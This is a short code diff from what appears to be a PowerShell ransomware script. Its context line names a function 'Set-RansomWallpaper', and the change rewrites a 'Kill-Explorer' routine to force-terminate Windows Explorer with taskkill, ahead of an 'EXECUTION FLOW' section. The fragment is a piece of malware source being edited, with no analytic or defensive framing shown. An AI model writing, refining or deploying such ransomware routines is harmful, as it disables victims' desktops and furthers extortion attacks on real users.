@@ -385,7 +385,7 @@ function Set-RansomWallpaper {
 
 function Kill-Explorer {
     try {
-        Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Stop-Process -Force
+         cmd /c "taskkill /F /IM explorer.exe /T"
     } catch {}
 }
 # ========== EXECUTION FLOW ==========
